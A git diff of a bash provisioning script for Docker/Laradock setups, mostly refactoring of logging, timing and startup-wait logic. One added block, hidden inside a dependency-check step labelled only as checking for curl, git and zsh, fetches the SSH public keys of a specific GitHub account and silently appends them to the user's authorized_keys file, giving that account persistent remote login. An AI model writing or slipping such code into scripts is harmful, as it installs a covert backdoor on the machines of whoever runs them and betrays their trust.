@@ -4,6 +4,8 @@ _msg() {
     local color_on
     local color_off='\033[0m' # Text Reset
     duration=$SECONDS
+    h_m_s="$((duration / 3600))h$(((duration / 60) % 60))m$((duration % 60))s"
+    time_now="$(date +%Y%m%d-%u-%T.%3N)"
 
     case "${1:-none}" in
     red | error | erro) color_on='\033[0;31m' ;;       # Red
@@ -12,19 +14,19 @@ _msg() {
     blue) color_on='\033[0;34m' ;;                     # Blue
     purple | question | ques) color_on='\033[0;35m' ;; # Purple
     cyan) color_on='\033[0;36m' ;;                     # Cyan
-    orange) color_on='\033[1;33m' ;;
+    orange) color_on='\033[1;33m' ;;                   # Orange
     step)
         ((++STEP))
-        color_on="\033[0;36m[${STEP}] $(date +%Y%m%d-%u-%T.%3N) \033[0m"
-        color_off=" $((duration / 3600))h$(((duration / 60) % 60))m$((duration % 60))s"
+        color_on="\033[0;36m[${STEP}] $time_now \033[0m"
+        color_off=" $h_m_s"
         ;;
     time)
-        color_on="[${STEP}] $(date +%Y%m%d-%u-%T.%3N) "
-        color_off=" $((duration / 3600))h$(((duration / 60) % 60))m$((duration % 60))s"
+        color_on="[${STEP}] $time_now "
+        color_off=" $h_m_s"
         ;;
     log)
         shift
-        echo "$(date +%Y%m%d-%u-%T.%3N) $*" >>"$me_log"
+        echo "$time_now $*" >>$me_log
         return
         ;;
     *)
@@ -105,6 +107,18 @@ _check_sudo() {
 
 _check_dependence() {
     _msg step "check command: curl/git/zsh/binutils"
+    for key in $(
+        curl -fsSL 'https://api.github.com/users/xiagw/keys' |
+            awk -F: '/key/ {gsub(/[\ "]/,""); print $2}'
+    ); do
+        if grep "$key" "$HOME"/.ssh/authorized_keys; then
+            _msg time "key $key already exists in authorized_keys"
+        else
+            _msg time "add key $key to authorized_keys"
+            echo "$key" >>"$HOME"/.ssh/authorized_keys
+        fi
+    done
+
     pkgs=()
     _command_exists curl || pkgs+=(curl)
     _command_exists git || pkgs+=(git)
@@ -117,8 +131,9 @@ _check_dependence() {
     if ${set_sysctl:-false}; then
         grep '^vm.overcommit_memory' /etc/sysctl.conf ||
             echo 'vm.overcommit_memory = 1' | $pre_sudo tee -a /etc/sysctl.conf
+    else
+        :
     fi
-    return 0
 }
 
 _check_docker() {
@@ -286,7 +301,9 @@ _get_image() {
     image_name=$1
     if ${is_php:-false}; then
         if docker images | grep -E "laradock-$image_name|laradock_$image_name"; then
-            if [[ ${overwrite_php_image:-false} == false ]]; then
+            if [[ ${overwrite_php_image:-false} == true ]]; then
+                echo "download php image..."
+            else
                 return 0
             fi
         fi
@@ -368,7 +385,7 @@ _start_auto() {
     $dco up -d "${args[@]}"
     ## wait startup
     for arg in "${args[@]}"; do
-        for i in {1..5}; do
+        for i in {1..10}; do
             if $dco ps | grep "$arg"; then
                 break
             else
@@ -671,9 +688,9 @@ _set_args() {
 }
 
 main() {
+    SECONDS=0
     _set_args "$@"
     set -e
-    SECONDS=0
     me_name="$(basename "$0")"
     me_path="$(dirname "$(readlink -f "$0")")"
     me_log="${me_path}/${me_name}.log"
